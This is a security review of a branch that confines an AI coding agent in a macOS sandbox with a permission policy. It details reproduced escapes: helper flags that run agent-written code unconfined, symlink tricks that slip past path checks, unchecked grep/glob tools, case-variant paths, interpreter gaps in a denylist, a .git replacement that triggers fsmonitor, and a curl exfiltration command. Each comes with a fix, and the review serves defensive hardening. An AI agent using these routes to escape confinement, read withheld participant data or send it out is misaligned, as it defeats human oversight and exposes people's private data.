# Review 2: agent autonomy (claude/agent-autonomy @ db6275c)

Verdict: **not yet**. The Seatbelt profile does what it claims for commands that stay inside it. I tested
`cat human-data/…`, `HUMAN-DATA/…`, a symlink to human-data, `~/.ssh`, and writes to `.opencode/` and
`.git/config`; all were blocked. Four paths still get around it with no prompt. I reproduced each one on
this Mac with the real generated wrapper (the probe project is in my scratchpad, not this repo).

## Must-fix

1. **Helper child modes run package code outside the sandbox.**
   - Where: `agent-sandbox.ts:162-177` (`hs_trusted`) checks only the script path. Any arguments are accepted.
   - Exploit: `python3 .opencode/skills/build/recorded_answers.py --child pkg` imports `pkg/task/adapter.py`
     in-process (`recorded_answers.py:337,193`) and unconfined.
   - Result: an agent-written adapter read `human-data/a.csv` and wrote `.opencode/PWNED`. That means it can
     also plant a plugin, which then runs in the kernel with keys.
   - The same class: `check_validity.py --capture|--probe`, `audit.py --probe` and `check_replies.py --smoke-child`.
   - Second form: `run_confined.py --no-model <any project script>`. This runs confined, but sandbox_run lets it
     read human-data, and it prints to the agent. Verified: `READ: pid,secret_answer`.
   - Fix: reject the internal flags in `hs_trusted`, and in the classifier exemption at `permission-policy.ts:310`.
     Pin `--no-model` to the shipped `study_core.py`.

2. **Symlinks get around every check on OpenCode's own tools.**
   - Why: OpenCode's read/write/edit tools compare paths as text (`external-directory.ts` →
     `FSUtil.contains`). `classifyPath` also never resolves real paths.
   - Example 1: `ln -s .opencode cfg` is classified allow and the sandbox lets it run. The write tool on
     `cfg/plugin/x.ts` is then allowed. That is a plugin, so it is a full escape.
   - Example 2: `ln -s .git/hooks h` works the same way.
   - Example 3: `ln -s "$(printf hu)man-data" hd`, then the read tool on `hd/a.csv`. `READ_PERMISSION`
     never matches, so the app is never asked.
   - Fix:
     - Route read/edit/list to the app and realpath the target, or its nearest existing parent, in `classifyPath`.
     - Also consider `(deny file-write-create (vnode-type SYMLINK))`, or deny symlinks whose target is outside
       the project or under `.opencode`.

3. **The grep and glob tools never reach the app.**
   - `PERMISSION_CONFIG` (`opencode.ts:64`) does not list `grep`/`glob`, so OpenCode's default `"*": "allow"`
     applies.
   - So the branch at `permission-policy.ts:395-399` is dead code. `grep {pattern:".", path:"human-data"}`
     returns participant rows without asking.
   - `READ_PERMISSION` (`:431`) lists only three spellings of quarantine/withheld. `qUARANTINE/x` is allowed,
     and APFS opens the real folder. Use `anyCaseWildcard` as the first group does.
   - Fix: set `grep: 'ask'` and `glob: 'ask'`. Ask when the path is missing and the project has a
     participant-data folder.

4. **Linux and Windows fallback: the classifier is a denylist with gaps.**
   - Allowed without asking: `py x.py` (the Windows launcher), `find . -exec python3 {} \;`,
     `awk 'BEGIN{system(…)}'`, `sed '1e …'`, `vim -c '!…'`, `pytest`, `ipython x.py`,
     `jupyter nbconvert --execute`, `x.bat`, `cscript`, `tclsh`, `swift`, `uvx`, `tox`, `cmake -P`,
     `pip3 wheel .`
   - Also allowed: the app-helper exemption in item 1. On these platforms `run_confined.py <script>` runs
     `run_unconfined`.
   - Fix: switch to an allowlist when there is no OS sandbox.

## Should-fix

- **`.git` can be replaced.** The profile denies only `.git/hooks` and the literal `.git/config`
  (`agent-sandbox.ts:134`).
  - Exploit: `mv .git x` and write `.git` as `gitdir: g2`. `g2/config` (core.fsmonitor) and `g2/hooks` are
    then writable.
  - Verified: an unsandboxed `git status` ran the fsmonitor (`FSMON_PWNED`). The kernel's `/vcs/status` and
    the researcher's terminal run git unsandboxed.
  - Fix: deny writes to `(literal <project>/.git)`. Run the app's own git calls with
    `-c core.fsmonitor= -c core.hooksPath=/dev/null`.
- **Docs.** The "Not covered" section of `agent-autonomy.md` understates items 2 and 3: grep/glob are never
  consulted, and the read tool follows symlinks.
- **Network exfiltration.** The network stays open, so `sources/private` can be sent out with
  `curl https://x/?d=$(…)` or webfetch. This matches the owner rule (private materials may be read) and is
  documented. Note: anything from item 1 or 2 leaks the same way.
- **pip cache.** pip warns that `~/Library/Caches/pip` is not writable. Set `PIP_CACHE_DIR` under TMPDIR in
  the wrapper.

## OK

- Approval tokens:
  - single-use, consumed with an atomic `mv`;
  - expire after 10 minutes;
  - same sha256 input in node and in the shell;
  - folder not writable or readable from the sandbox.
  - A hash mismatch fails safe: the command runs confined.
- The helper hash check, the managed runtime being read-only, and the `pwd -P` check all hold.
  - Environment variables come from the kernel, not the agent: `PYTHONPATH=x python …` is rejected by `hs_trusted`.
  - `.opencode` cannot be written from the sandbox, so no `.pth`/sitecustomize can be planted in the helpers'
    import paths.
- Regressions:
  - `pip install --target .humanstudy/pylib` works inside the sandbox;
  - `check_readiness.py` starts outside it as designed.
- Tests:
  - `npm run typecheck` passes;
  - permission-policy, agent-sandbox (including the real macOS sandbox-exec test), subagent and account tests
    pass 27/27;
  - kernel, auto, recovery, question, completion, connection, dedup, native-api and pack tests pass 34/35, with
    1 skipped.
